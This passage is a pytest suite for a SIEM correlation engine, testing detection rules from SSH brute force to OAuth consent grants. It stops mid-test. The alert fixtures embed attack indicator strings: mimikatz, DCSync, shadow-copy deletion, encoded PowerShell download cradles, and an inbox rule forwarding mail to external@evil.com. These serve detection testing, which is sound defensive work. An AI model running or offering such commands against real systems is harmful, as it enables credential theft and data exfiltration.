"""
Suite 06 — Correlation Rule Tests (CR-001 → CR-056)

Tests every rule in ALL_RULES for:
  • Registry integrity  (IDs, uniqueness, format, severity, tactics)
  • Safety             (empty list, None fields, never raises)
  • Positive match     (correct pattern → not None)
  • Negative no-match  (insufficient data → None)
  • Temporal ordering  (where rules enforce timestamp ordering)
"""
import sys
import os
import pytest
from datetime import datetime, timezone, timedelta
from unittest.mock import MagicMock

# ---------------------------------------------------------------------------
# Stub heavy dependencies before importing correlator
# ---------------------------------------------------------------------------
for _mod in (
    'sqlalchemy', 'sqlalchemy.ext', 'sqlalchemy.ext.asyncio',
    'sqlalchemy.orm', 'models', 'structlog',
):
    if _mod not in sys.modules:
        sys.modules[_mod] = MagicMock()

sys.path.insert(0, os.path.join(
    os.path.dirname(__file__), '../../backend/cysiemstack/correlation_engine'))

from correlator import (  # noqa: E402
    ALL_RULES, CorrelationRule,
    SSHBruteForceLogin, LoginPrivEsc, FullCompromiseChain, WebToFIM,
    LateralMovement, HostTakeover, AccountCreationLogin, ScanThenExploit,
    DataExfiltration, ServiceAccountAnomaly, EventLogCleared, DNSTunnelling,
    CredentialDumping, RansomwareIndicators, C2Beacon, PasswordSpraying,
    WindowsBruteForce, DormantAccountRebirth, DomainAdminGroupChange,
    GoldenTicketAnomaly, RegistryPersistence, ScheduledTaskAbuse,
    ProcessInjection, EncodedCommandExecution, WebShellExecution,
    SecurityToolDisabled, UnusualOutboundPort, RDPToInternet,
    InternalSubnetScan, LargeCloudUpload, CloudLoginNoMFA,
    CloudIAMPrivilegeChange, MassCloudDeletion, MailForwardingRule,
    OAuthConsentGrant, WMIExecution, PassTheHash, MFAPushBombing,
    SessionCookieTheft, CryptominingDetection, ShadowCopyDeletion,
    LOLBASDownloadCradle, DGADetection, AutomatedCollection,
    ArchiveCollectedData, PhishingAttachmentExec, StartupFolderPersistence,
    CronPersistence, AccessTokenManipulation, RemoteServiceCreation,
    DLLHijacking, HTTPSLongPollC2, CredentialsInFiles,
    SMBShareEnumeration, DCSyncAttack, HighResourceUtilization,
)

# ---------------------------------------------------------------------------
# Alert factory
# ---------------------------------------------------------------------------
_NOW = datetime.now(timezone.utc)


def _a(**kw):
    """Build a minimal alert dict; override any field via kwargs."""
    base = {
        'wazuh_id':    'w1',
        'rule_id':     0,
        'rule_desc':   '',
        'agent_id':    'agent1',
        'agent_name':  'host1',
        'username':    None,
        'src_ip':      None,
        'category':    None,
        'timestamp':   _NOW,
        'base_score':  5.0,
        'file_path':   None,
        'process_name': None,
        'raw_log':     '',
    }
    base.update(kw)
    return base


def _null_alert():
    """Alert where every optional field is None."""
    return _a(wazuh_id=None, rule_id=0, rule_desc=None, agent_id='x',
              agent_name=None, username=None, src_ip=None, category=None,
              file_path=None, process_name=None, raw_log=None)


# ===========================================================================
# Suite 06-A: Registry Integrity
# ===========================================================================
class TestRuleRegistry:
    """ALL_RULES list structure and metadata invariants."""

    def test_min_rule_count(self):
        assert len(ALL_RULES) >= 56, f"Expected ≥56 rules, got {len(ALL_RULES)}"

    def test_all_ids_start_with_cr(self):
        bad = [r.rule_id for r in ALL_RULES if not r.rule_id.startswith('CR-')]
        assert not bad, f"Rule IDs not starting with 'CR-': {bad}"

    def test_all_ids_unique(self):
        ids = [r.rule_id for r in ALL_RULES]
        assert len(ids) == len(set(ids)), "Duplicate rule IDs found"

    def test_all_ids_sequential(self):
        nums = sorted(int(r.rule_id.split('-')[1]) for r in ALL_RULES)
        assert nums == list(range(1, len(ALL_RULES) + 1)), \
            f"Non-sequential IDs. Got: {nums[:5]}..."

    def test_severity_values_valid(self):
        valid = {'low', 'medium', 'high', 'critical'}
        bad = [(r.rule_id, r.severity) for r in ALL_RULES if r.severity not in valid]
        assert not bad, f"Invalid severities: {bad}"

    def test_tactics_non_empty(self):
        bad = [r.rule_id for r in ALL_RULES if not r.tactics]
        assert not bad, f"Rules with empty tactics: {bad}"

    def test_all_have_name_and_description(self):
        bad = [r.rule_id for r in ALL_RULES if not r.name or not r.description]
        assert not bad, f"Rules missing name/description: {bad}"

    def test_window_positive(self):
        bad = [r.rule_id for r in ALL_RULES
               if not hasattr(r, 'window') or r.window.total_seconds() <= 0]
        assert not bad, f"Rules with non-positive window: {bad}"


# ===========================================================================
# Suite 06-B: Safety — every rule tolerates empty and None-field input
# ===========================================================================
class TestRuleSafety:
    """match([]) → None; match([null_alert]) → None or dict; never raises."""

    @pytest.mark.parametrize("rule", ALL_RULES, ids=[r.rule_id for r in ALL_RULES])
    def test_empty_list_returns_none(self, rule):
        result = rule.match([])
        assert result is None, f"{rule.rule_id}: match([]) should return None"

    @pytest.mark.parametrize("rule", ALL_RULES, ids=[r.rule_id for r in ALL_RULES])
    def test_none_fields_never_raises(self, rule):
        alert = _null_alert()
        try:
            result = rule.match([alert])
        except Exception as exc:
            pytest.fail(f"{rule.rule_id}: match([null_alert]) raised {type(exc).__name__}: {exc}")
        assert result is None or isinstance(result, dict), \
            f"{rule.rule_id}: unexpected return type {type(result)}"

    @pytest.mark.parametrize("rule", ALL_RULES, ids=[r.rule_id for r in ALL_RULES])
    def test_match_returns_dict_or_none(self, rule):
        result = rule.match([_null_alert()])
        assert result is None or isinstance(result, dict)

    @pytest.mark.parametrize("rule", ALL_RULES, ids=[r.rule_id for r in ALL_RULES])
    def test_match_dict_has_required_keys(self, rule):
        """When a rule fires, result must have key_alert_ids, detail, confidence."""
        # Use a maximally triggering alert
        alert = _a(rule_id=5715, rule_desc='test exploit attack', category='fim',
                   username='svc_admin', src_ip='10.0.0.1',
                   file_path='currentversion\\run\\malware.exe',
                   raw_log='pass-the-hash mimikatz dcsync vssadmin delete shadows xmrig')
        try:
            result = rule.match([alert])
        except Exception:
            result = None
        if result is not None:
            assert 'key_alert_ids' in result, f"{rule.rule_id}: missing key_alert_ids"
            assert 'detail' in result, f"{rule.rule_id}: missing detail"
            assert 'confidence' in result, f"{rule.rule_id}: missing confidence"
            assert 0.0 <= result['confidence'] <= 1.0, \
                f"{rule.rule_id}: confidence out of range {result['confidence']}"


# ===========================================================================
# Suite 06-C: Individual Rule Logic Tests
# ===========================================================================

class TestCR001_SSHBruteForce:
    rule = SSHBruteForceLogin()

    def test_positive_5_failures_plus_success(self):
        alerts = [_a(rule_id=5710) for _ in range(5)] + [_a(rule_id=5715)]
        assert self.rule.match(alerts) is not None

    def test_positive_threshold_is_5_not_6(self):
        """Threshold is len(failures) >= 5 — exactly 5 must fire."""
        alerts = [_a(rule_id=5710) for _ in range(5)] + [_a(rule_id=5715)]
        assert self.rule.match(alerts) is not None

    def test_negative_4_failures_no_fire(self):
        alerts = [_a(rule_id=5710) for _ in range(4)] + [_a(rule_id=5715)]
        assert self.rule.match(alerts) is None

    def test_negative_5_failures_no_success(self):
        alerts = [_a(rule_id=5710) for _ in range(6)]
        assert self.rule.match(alerts) is None

    def test_positive_rule_5711_counts_as_failure(self):
        alerts = [_a(rule_id=5711) for _ in range(5)] + [_a(rule_id=5718)]
        assert self.rule.match(alerts) is not None

    def test_positive_confidence_scales_with_failures(self):
        alerts = [_a(rule_id=5710) for _ in range(20)] + [_a(rule_id=5715)]
        r = self.rule.match(alerts)
        assert r['confidence'] == 1.0

    def test_positive_confidence_partial(self):
        alerts = [_a(rule_id=5710) for _ in range(5)] + [_a(rule_id=5715)]
        r = self.rule.match(alerts)
        assert r['confidence'] == pytest.approx(5 / 20.0)


class TestCR002_LoginPrivEsc:
    rule = LoginPrivEsc()

    def test_positive_same_agent_privesc_after_login(self):
        t0 = _NOW
        login = _a(rule_id=5715, agent_id='a1', username='bob', timestamp=t0)
        priv  = _a(rule_id=5400, agent_id='a1', timestamp=t0 + timedelta(seconds=5))
        assert self.rule.match([login, priv]) is not None

    def test_negative_different_agent(self):
        t0 = _NOW
        login = _a(rule_id=5715, agent_id='a1', username='bob', timestamp=t0)
        priv  = _a(rule_id=5400, agent_id='a2', timestamp=t0 + timedelta(seconds=5))
        assert self.rule.match([login, priv]) is None

    def test_negative_privesc_before_login(self):
        t0 = _NOW
        login = _a(rule_id=5715, agent_id='a1', username='bob', timestamp=t0)
        priv  = _a(rule_id=5400, agent_id='a1', timestamp=t0 - timedelta(seconds=5))
        assert self.rule.match([login, priv]) is None

    def test_negative_login_without_username(self):
        t0 = _NOW
        login = _a(rule_id=5715, agent_id='a1', username=None, timestamp=t0)
        priv  = _a(rule_id=5400, agent_id='a1', timestamp=t0 + timedelta(seconds=5))
        assert self.rule.match([login, priv]) is None

    def test_negative_only_login(self):
        assert self.rule.match([_a(rule_id=5715, username='bob')]) is None


class TestCR003_FullCompromiseChain:
    rule = FullCompromiseChain()

    def test_positive_all_three_components_same_host(self):
        alerts = [
            _a(rule_id=5715, agent_id='h1'),     # auth
            _a(rule_id=5400, agent_id='h1'),      # privesc
            _a(category='fim', agent_id='h1'),    # impact
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_missing_impact(self):
        alerts = [_a(rule_id=5715, agent_id='h1'), _a(rule_id=5400, agent_id='h1')]
        assert self.rule.match(alerts) is None

    def test_negative_different_hosts(self):
        alerts = [
            _a(rule_id=5715, agent_id='h1'),
            _a(rule_id=5400, agent_id='h2'),
            _a(category='fim', agent_id='h3'),
        ]
        assert self.rule.match(alerts) is None

    def test_positive_malware_counts_as_impact(self):
        alerts = [
            _a(rule_id=5715, agent_id='h1'),
            _a(rule_id=18101, agent_id='h1'),
            _a(category='malware', agent_id='h1'),
        ]
        assert self.rule.match(alerts) is not None

    def test_positive_returns_3_key_alerts(self):
        alerts = [
            _a(rule_id=5715, agent_id='h1', wazuh_id='w-auth'),
            _a(rule_id=5400, agent_id='h1', wazuh_id='w-priv'),
            _a(category='fim', agent_id='h1', wazuh_id='w-fim'),
        ]
        r = self.rule.match(alerts)
        assert len(r['key_alert_ids']) == 3


class TestCR004_WebToFIM:
    rule = WebToFIM()

    def test_positive_fim_after_web_attack(self):
        t0 = _NOW
        web = _a(category='web', rule_desc='SQL injection attack', timestamp=t0)
        fim = _a(category='fim', timestamp=t0 + timedelta(seconds=10))
        assert self.rule.match([web, fim]) is not None

    def test_negative_fim_before_web(self):
        t0 = _NOW
        web = _a(category='web', rule_desc='rce exploit', timestamp=t0)
        fim = _a(category='fim', timestamp=t0 - timedelta(seconds=10))
        assert self.rule.match([web, fim]) is None

    def test_negative_web_without_exploit_keyword(self):
        t0 = _NOW
        web = _a(category='web', rule_desc='page not found', timestamp=t0)
        fim = _a(category='fim', timestamp=t0 + timedelta(seconds=5))
        assert self.rule.match([web, fim]) is None

    def test_negative_only_fim(self):
        assert self.rule.match([_a(category='fim')]) is None

    def test_positive_traversal_keyword_triggers(self):
        t0 = _NOW
        web = _a(category='web', rule_desc='path traversal attempt', timestamp=t0)
        fim = _a(category='fim', timestamp=t0 + timedelta(seconds=1))
        assert self.rule.match([web, fim]) is not None


class TestCR005_LateralMovement:
    rule = LateralMovement()

    def test_positive_3_hosts_from_same_ip(self):
        alerts = [
            _a(rule_id=5715, src_ip='1.2.3.4', agent_id=f'host{i}')
            for i in range(3)
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_only_2_hosts(self):
        alerts = [
            _a(rule_id=5715, src_ip='1.2.3.4', agent_id=f'host{i}')
            for i in range(2)
        ]
        assert self.rule.match(alerts) is None

    def test_negative_no_src_ip(self):
        alerts = [_a(rule_id=5715, src_ip=None, agent_id=f'h{i}') for i in range(5)]
        assert self.rule.match(alerts) is None

    def test_positive_confidence_scales_with_hosts(self):
        alerts = [
            _a(rule_id=5715, src_ip='1.2.3.4', agent_id=f'host{i}')
            for i in range(5)
        ]
        r = self.rule.match(alerts)
        assert r['confidence'] == 1.0


class TestCR006_HostTakeover:
    rule = HostTakeover()

    def test_positive_rootkit_plus_fim(self):
        alerts = [_a(rule_id=510), _a(category='fim')]
        assert self.rule.match(alerts) is not None

    def test_positive_rootkit_id_range(self):
        for rid in [510, 520, 530, 535]:
            alerts = [_a(rule_id=rid), _a(category='fim')]
            assert self.rule.match(alerts) is not None, f"rule_id {rid} should trigger"

    def test_negative_rootkit_out_of_range(self):
        alerts = [_a(rule_id=509), _a(category='fim')]
        assert self.rule.match(alerts) is None

    def test_negative_only_rootkit(self):
        assert self.rule.match([_a(rule_id=510)]) is None


class TestCR007_AccountCreationLogin:
    rule = AccountCreationLogin()

    def test_positive_create_then_login_same_username(self):
        t0 = _NOW
        create = _a(rule_id=5902, username='mallory', timestamp=t0)
        login  = _a(rule_id=5715, username='mallory', timestamp=t0 + timedelta(minutes=5))
        assert self.rule.match([create, login]) is not None

    def test_negative_login_before_create(self):
        t0 = _NOW
        create = _a(rule_id=5902, username='mallory', timestamp=t0)
        login  = _a(rule_id=5715, username='mallory', timestamp=t0 - timedelta(seconds=1))
        assert self.rule.match([create, login]) is None

    def test_negative_different_usernames(self):
        t0 = _NOW
        create = _a(rule_id=5902, username='alice', timestamp=t0)
        login  = _a(rule_id=5715, username='bob',   timestamp=t0 + timedelta(seconds=5))
        assert self.rule.match([create, login]) is None

    def test_negative_no_username(self):
        t0 = _NOW
        create = _a(rule_id=5902, username=None, timestamp=t0)
        login  = _a(rule_id=5715, username=None, timestamp=t0 + timedelta(seconds=5))
        assert self.rule.match([create, login]) is None


class TestCR008_ScanThenExploit:
    rule = ScanThenExploit()

    def test_positive_scan_then_exploit(self):
        alerts = [
            _a(category='scan'),
            _a(rule_desc='Buffer overflow exploit attempt'),
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_only_scan(self):
        assert self.rule.match([_a(category='scan')]) is None

    def test_negative_exploit_without_scan(self):
        assert self.rule.match([_a(rule_desc='injection attack')]) is None

    def test_positive_rce_keyword_triggers(self):
        assert self.rule.match([_a(category='scan'), _a(rule_desc='rce attempt')]) is not None


class TestCR009_DataExfiltration:
    rule = DataExfiltration()

    def test_positive_fim_then_net_transfer(self):
        t0 = _NOW
        fim = _a(category='fim', timestamp=t0)
        net = _a(rule_desc='outbound curl request', timestamp=t0 + timedelta(seconds=1))
        assert self.rule.match([fim, net]) is not None

    def test_negative_net_before_fim(self):
        t0 = _NOW
        fim = _a(category='fim', timestamp=t0)
        net = _a(rule_desc='outbound transfer', timestamp=t0 - timedelta(seconds=1))
        assert self.rule.match([fim, net]) is None

    def test_negative_only_fim(self):
        assert self.rule.match([_a(category='fim')]) is None

    def test_positive_wget_keyword(self):
        t0 = _NOW
        fim = _a(category='fim', timestamp=t0)
        net = _a(rule_desc='wget to external host', timestamp=t0 + timedelta(seconds=1))
        assert self.rule.match([fim, net]) is not None


class TestCR010_ServiceAccountAnomaly:
    rule = ServiceAccountAnomaly()

    def test_positive_2_service_account_logins(self):
        alerts = [
            _a(rule_id=5715, username='svc_admin'),
            _a(rule_id=5718, username='svc_admin'),
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_only_1_service_alert(self):
        assert self.rule.match([_a(rule_id=5715, username='svc_admin')]) is None

    def test_negative_regular_user(self):
        alerts = [_a(rule_id=5715, username='alice'), _a(rule_id=5718, username='alice')]
        assert self.rule.match(alerts) is None

    def test_positive_daemon_pattern_triggers(self):
        alerts = [_a(rule_id=5715, username='daemon_task'), _a(rule_id=5400, username='daemon_task')]
        assert self.rule.match(alerts) is not None


class TestCR011_EventLogCleared:
    rule = EventLogCleared()

    def test_positive_rule_18101(self):
        assert self.rule.match([_a(rule_id=18101)]) is not None

    def test_positive_rule_60101(self):
        assert self.rule.match([_a(rule_id=60101)]) is not None

    def test_negative_unrelated_rule_id(self):
        assert self.rule.match([_a(rule_id=5715)]) is None

    def test_positive_confidence_high(self):
        r = self.rule.match([_a(rule_id=18101)])
        assert r['confidence'] == 0.95


class TestCR012_DNSTunnelling:
    rule = DNSTunnelling()

    def test_positive_20_dns_queries_same_host(self):
        alerts = [_a(rule_id=82200, agent_id='host1') for _ in range(20)]
        assert self.rule.match(alerts) is not None

    def test_negative_19_queries(self):
        alerts = [_a(rule_id=82200, agent_id='host1') for _ in range(19)]
        assert self.rule.match(alerts) is None

    def test_positive_dns_keyword_in_desc(self):
        alerts = [_a(rule_desc='dns query', agent_id='host1') for _ in range(20)]
        assert self.rule.match(alerts) is not None

    def test_positive_spread_across_hosts_insufficient(self):
        """20 DNS queries but spread across 20 hosts — no single host hits threshold."""
        alerts = [_a(rule_id=82200, agent_id=f'host{i}') for i in range(20)]
        assert self.rule.match(alerts) is None


class TestCR013_CredentialDumping:
    rule = CredentialDumping()

    def test_positive_lsass_then_login(self):
        alerts = [
            _a(rule_desc='lsass access detected'),
            _a(rule_id=5715, src_ip='10.0.0.1'),
        ]
        assert self.rule.match(alerts) is not None

    def test_positive_mimikatz_keyword(self):
        alerts = [_a(rule_desc='mimikatz sekurlsa'), _a(rule_id=5715, src_ip='10.0.0.1')]
        assert self.rule.match(alerts) is not None

    def test_negative_dump_without_login(self):
        assert self.rule.match([_a(rule_desc='lsass access')]) is None

    def test_negative_login_without_dump(self):
        assert self.rule.match([_a(rule_id=5715, src_ip='10.0.0.1')]) is None


class TestCR014_Ransomware:
    rule = RansomwareIndicators()

    def test_positive_30_fim_plus_outbound(self):
        t0 = _NOW
        fim_alerts = [_a(category='fim', file_path='/data/file.txt', timestamp=t0 - timedelta(seconds=i))
                      for i in range(30)]
        net_alert  = _a(rule_desc='outbound connection', timestamp=t0)
        assert self.rule.match(fim_alerts + [net_alert]) is not None

    def test_positive_encrypted_extension_plus_net(self):
        t0 = _NOW
        fim = _a(category='fim', file_path='/data/file.encrypted', timestamp=t0)
        net = _a(rule_desc='wget external', timestamp=t0)
        assert self.rule.match([fim, net]) is not None

    def test_negative_only_fim_no_net(self):
        alerts = [_a(category='fim', file_path=f'/data/f{i}') for i in range(35)]
        assert self.rule.match(alerts) is None

    def test_positive_higher_confidence_for_encrypted_ext(self):
        t0 = _NOW
        fim = _a(category='fim', file_path='/data/f.locked', timestamp=t0)
        net = _a(rule_desc='outbound', timestamp=t0)
        r = self.rule.match([fim, net])
        assert r['confidence'] == 0.85


class TestCR015_C2Beacon:
    rule = C2Beacon()

    def test_positive_regular_beaconing_pattern(self):
        """5+ network alerts at ~60s intervals with low variance."""
        base = _NOW
        alerts = [
            _a(src_ip='evil.c2', category='network', rule_desc='outbound connection established',
               timestamp=base + timedelta(seconds=i * 60))
            for i in range(6)
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_fewer_than_5_net_alerts(self):
        base = _NOW
        alerts = [
            _a(src_ip='evil.c2', rule_desc='outbound connection established',
               timestamp=base + timedelta(seconds=i * 60))
            for i in range(4)
        ]
        assert self.rule.match(alerts) is None

    def test_negative_irregular_intervals(self):
        """High-variance intervals should not trigger beaconing."""
        base = _NOW
        gaps = [5, 3600, 1, 7200, 2]
        alerts = []
        t = base
        for g in gaps:
            alerts.append(_a(src_ip='dst', rule_desc='outbound connection established',
                             category='network', timestamp=t))
            t += timedelta(seconds=g)
        assert self.rule.match(alerts) is None


class TestCR016_PasswordSpraying:
    rule = PasswordSpraying()

    def test_positive_20_different_usernames_same_src(self):
        alerts = [
            _a(rule_id=5710, src_ip='attacker', username=f'user{i}')
            for i in range(20)
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_19_usernames(self):
        alerts = [
            _a(rule_id=5710, src_ip='attacker', username=f'user{i}')
            for i in range(19)
        ]
        assert self.rule.match(alerts) is None

    def test_negative_no_src_ip(self):
        alerts = [_a(rule_id=5710, src_ip=None, username=f'u{i}') for i in range(25)]
        assert self.rule.match(alerts) is None


class TestCR017_WindowsBruteForce:
    rule = WindowsBruteForce()

    def test_positive_5_win_failures_then_success(self):
        alerts = [_a(rule_id=60122) for _ in range(5)] + [_a(rule_id=60106)]
        assert self.rule.match(alerts) is not None

    def test_negative_4_failures(self):
        alerts = [_a(rule_id=60122) for _ in range(4)] + [_a(rule_id=60106)]
        assert self.rule.match(alerts) is None

    def test_negative_failures_no_success(self):
        alerts = [_a(rule_id=60122) for _ in range(10)]
        assert self.rule.match(alerts) is None


class TestCR018_DormantAccountRebirth:
    rule = DormantAccountRebirth()

    def test_positive_first_login_with_src_ip(self):
        """No prior alerts for user, external src_ip → dormant rebirth indicator."""
        login = _a(rule_id=5715, username='ghost_user', src_ip='203.0.113.1')
        assert self.rule.match([login]) is not None

    def test_positive_off_hours_no_prior(self):
        """No prior alerts, off-hours login → dormant rebirth."""
        ts = _NOW.replace(hour=3)
        login = _a(rule_id=5715, username='sleeper', src_ip=None, timestamp=ts)
        assert self.rule.match([login]) is not None

    def test_negative_no_login_alerts(self):
        alerts = [_a(rule_id=5710, username='bob')]
        assert self.rule.match(alerts) is None

    def test_negative_business_hours_internal_no_prior_fail(self):
        """Business hours, no src_ip, no preceding fail → not flagged."""
        ts = _NOW.replace(hour=10)
        login = _a(rule_id=5715, username='alice', src_ip=None, timestamp=ts)
        assert self.rule.match([login]) is None


class TestCR019_DomainAdminGroupChange:
    rule = DomainAdminGroupChange()

    def test_positive_win_group_change_rule_id(self):
        assert self.rule.match([_a(rule_id=60148)]) is not None

    def test_positive_domain_admins_keyword(self):
        assert self.rule.match([_a(rule_desc='Added to Domain Admins group')]) is not None

    def test_negative_unrelated(self):
        assert self.rule.match([_a(rule_id=5715)]) is None


class TestCR020_GoldenTicket:
    rule = GoldenTicketAnomaly()

    def test_positive_kerb_rule_id(self):
        assert self.rule.match([_a(rule_id=60210)]) is not None

    def test_positive_kerberoast_keyword(self):
        assert self.rule.match([_a(rule_desc='kerberoast ticket request')]) is not None

    def test_positive_rc4_keyword(self):
        assert self.rule.match([_a(rule_desc='Encryption: RC4-HMAC 0x17')]) is not None

    def test_negative_normal_login(self):
        assert self.rule.match([_a(rule_id=5715)]) is None


class TestCR021_RegistryPersistence:
    rule = RegistryPersistence()

    def test_positive_fim_on_run_key(self):
        alerts = [_a(category='fim',
                     file_path='HKLM\\Software\\Microsoft\\CurrentVersion\\Run\\malware')]
        assert self.rule.match(alerts) is not None

    def test_positive_runonce_path(self):
        alerts = [_a(category='fim',
                     file_path='HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\persist')]
        assert self.rule.match(alerts) is not None

    def test_positive_keyword_in_desc(self):
        alerts = [_a(rule_desc='Run key modification detected')]
        assert self.rule.match(alerts) is not None

    def test_negative_fim_not_registry(self):
        alerts = [_a(category='fim', file_path='/etc/hosts')]
        assert self.rule.match(alerts) is None


class TestCR022_ScheduledTaskAbuse:
    rule = ScheduledTaskAbuse()

    def test_positive_task_creation_suspicious_path(self):
        alerts = [_a(rule_id=60280,
                     rule_desc='Scheduled task created pointing to C:\\Temp\\payload.exe')]
        assert self.rule.match(alerts) is not None

    def test_positive_appdata_path(self):
        alerts = [_a(rule_desc='scheduled task C:\\Users\\user\\AppData\\malware.exe')]
        assert self.rule.match(alerts) is not None

    def test_negative_task_not_suspicious(self):
        alerts = [_a(rule_id=60280, rule_desc='Scheduled task created C:\\Windows\\System32\\clean.exe')]
        assert self.rule.match(alerts) is None


class TestCR023_ProcessInjection:
    rule = ProcessInjection()

    def test_positive_chrome_spawning_cmd(self):
        alerts = [_a(rule_desc='chrome.exe spawned child process cmd.exe')]
        assert self.rule.match(alerts) is not None

    def test_positive_word_spawning_powershell(self):
        alerts = [_a(rule_desc='winword.exe parent process powershell.exe')]
        assert self.rule.match(alerts) is not None

    def test_negative_no_injection_pattern(self):
        alerts = [_a(rule_desc='notepad.exe opened')]
        assert self.rule.match(alerts) is None


class TestCR024_EncodedCommand:
    rule = EncodedCommandExecution()

    def test_positive_encoded_command_flag(self):
        alerts = [_a(rule_desc='PowerShell -EncodedCommand dABlAHMAdAA=')]
        assert self.rule.match(alerts) is not None

    def test_positive_iex_invoke_expression(self):
        alerts = [_a(rule_desc='iex( invoke-expression download')]
        assert self.rule.match(alerts) is not None

    def test_positive_frombase64string(self):
        alerts = [_a(raw_log='FromBase64String hidden -w bypass')]
        assert self.rule.match(alerts) is not None

    def test_negative_clean_powershell(self):
        alerts = [_a(rule_desc='PowerShell Get-ChildItem')]
        assert self.rule.match(alerts) is None


class TestCR025_WebShell:
    rule = WebShellExecution()

    def test_positive_w3wp_spawning_cmd(self):
        alerts = [_a(rule_desc='w3wp.exe spawned cmd.exe')]
        assert self.rule.match(alerts) is not None

    def test_positive_apache_spawning_bash(self):
        alerts = [_a(rule_desc='apache2 parent process bash')]
        assert self.rule.match(alerts) is not None

    def test_positive_webshell_keyword(self):
        alerts = [_a(rule_desc='web shell detected on server')]
        assert self.rule.match(alerts) is not None

    def test_negative_normal_web_request(self):
        alerts = [_a(rule_desc='httpd GET /index.html 200')]
        assert self.rule.match(alerts) is None


class TestCR026_SecurityToolDisabled:
    rule = SecurityToolDisabled()

    def test_positive_windefend_stopped(self):
        """'windefend' is in SECURITY_SERVICES; 'service stopped' triggers the path."""
        alerts = [_a(rule_id=7036, rule_desc='windefend service stopped')]
        assert self.rule.match(alerts) is not None

    def test_positive_crowdstrike_disabled(self):
        alerts = [_a(rule_desc='CrowdStrike service disabled')]
        assert self.rule.match(alerts) is not None

    def test_positive_real_time_protection_disabled(self):
        alerts = [_a(rule_desc='real-time protection disabled Windows Defender')]
        assert self.rule.match(alerts) is not None

    def test_negative_unrelated_service_stopped(self):
        alerts = [_a(rule_id=7036, rule_desc='Print Spooler service stopped')]
        assert self.rule.match(alerts) is None


class TestCR027_UnusualOutboundPort:
    rule = UnusualOutboundPort()

    def test_positive_metasploit_port_4444(self):
        alerts = [_a(src_ip='10.0.0.1', rule_desc='outbound connection :4444')]
        assert self.rule.match(alerts) is not None

    def test_positive_irc_port_6667(self):
        alerts = [_a(src_ip='10.0.0.1', rule_desc='connection port 6667')]
        assert self.rule.match(alerts) is not None

    def test_negative_no_suspicious_port(self):
        alerts = [_a(src_ip='10.0.0.1', rule_desc='outbound connection :443')]
        assert self.rule.match(alerts) is None


class TestCR028_RDPToInternet:
    rule = RDPToInternet()

    def test_positive_outbound_rdp(self):
        alerts = [_a(src_ip='1.2.3.4', rule_desc='outbound connection :3389 to internet')]
        assert self.rule.match(alerts) is not None

    def test_positive_rdp_keyword_with_egress(self):
        alerts = [_a(src_ip='1.2.3.4', rule_desc='rdp egress connection attempted')]
        assert self.rule.match(alerts) is not None

    def test_negative_rdp_inbound(self):
        alerts = [_a(src_ip='1.2.3.4', rule_desc='rdp login accepted')]
        assert self.rule.match(alerts) is None


class TestCR029_InternalSubnetScan:
    rule = InternalSubnetScan()

    def test_positive_20_scan_events_same_host(self):
        alerts = [_a(category='scan', agent_id='scanner') for _ in range(20)]
        assert self.rule.match(alerts) is not None

    def test_positive_ping_sweep_keyword(self):
        alerts = [
            _a(rule_desc='ping sweep detected', agent_id='scanner')
            for _ in range(20)
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_19_events(self):
        alerts = [_a(category='scan', agent_id='scanner') for _ in range(19)]
        assert self.rule.match(alerts) is None


class TestCR030_LargeCloudUpload:
    rule = LargeCloudUpload()

    def test_positive_3_mega_nz_from_same_host(self):
        alerts = [
            _a(rule_desc='connection to mega.nz', agent_id='victim')
            for _ in range(3)
        ]
        assert self.rule.match(alerts) is not None

    def test_positive_dropbox_upload(self):
        alerts = [
            _a(rule_desc='upload to dropbox.com', agent_id='victim')
            for _ in range(3)
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_only_2_events(self):
        alerts = [
            _a(rule_desc='mega.nz connection', agent_id='victim')
            for _ in range(2)
        ]
        assert self.rule.match(alerts) is None


class TestCR031_CloudLoginNoMFA:
    rule = CloudLoginNoMFA()

    def test_positive_mfaused_no(self):
        assert self.rule.match([_a(rule_desc='ConsoleLogin mfaUsed: No')]) is not None

    def test_positive_without_mfa_keyword(self):
        assert self.rule.match([_a(rule_desc='Azure login without MFA')]) is not None

    def test_negative_with_mfa(self):
        assert self.rule.match([_a(rule_desc='ConsoleLogin mfaUsed: Yes')]) is None


class TestCR032_CloudIAMPrivilege:
    rule = CloudIAMPrivilegeChange()

    def test_positive_administrator_access(self):
        assert self.rule.match([_a(rule_desc='AttachUserPolicy AdministratorAccess')]) is not None

    def test_positive_global_administrator(self):
        assert self.rule.match([_a(rule_desc='Add member to Global Administrator role')]) is not None

    def test_positive_attachuserpolicy_fires_on_any_policy_attach(self):
        """'attachuserpolicy' is an IAM_KEYWORD — fires on any policy attachment, not just admin."""
        assert self.rule.match([_a(rule_desc='AttachUserPolicy AmazonS3ReadOnly')]) is not None

    def test_negative_unrelated_cloud_event(self):
        """Listing S3 objects doesn't contain any IAM_KEYWORDS → no match."""
        assert self.rule.match([_a(rule_desc='ListObjects completed successfully')]) is None


class TestCR033_MassCloudDeletion:
    rule = MassCloudDeletion()

    def test_positive_5_deletions(self):
        alerts = [_a(rule_desc='DeleteBucket s3://data') for _ in range(5)]
        assert self.rule.match(alerts) is not None

    def test_negative_4_deletions(self):
        alerts = [_a(rule_desc='DeleteBucket s3://data') for _ in range(4)]
        assert self.rule.match(alerts) is None

    def test_positive_azure_storage_delete(self):
        alerts = [_a(rule_desc='storageaccounts/delete operation') for _ in range(5)]
        assert self.rule.match(alerts) is not None


class TestCR034_MailForwardingRule:
    rule = MailForwardingRule()

    def test_positive_forwardto_keyword(self):
        assert self.rule.match([_a(rule_desc='New-InboxRule ForwardTo external@evil.com')]) is not None

    def test_positive_mail_forward(self):
        assert self.rule.match([_a(rule_desc='mail forward rule created')]) is not None

    def test_negative_normal_email(self):
        assert self.rule.match([_a(rule_desc='Email received from boss@company.com')]) is None


class TestCR035_OAuthConsentGrant:
    rule = OAuthConsentGrant()

    def test_positive_mail_read_permission(self):
        assert self.rule.match([_a(rule_desc='Application permission granted Mail.Read')]) is not None

    def test_positive_files_readwrite(self):
        assert self.rule.match([_a(rule_desc='OAuth consent Files.ReadWrite granted')]) is not None

    def test_negative_normal_oauth(self):
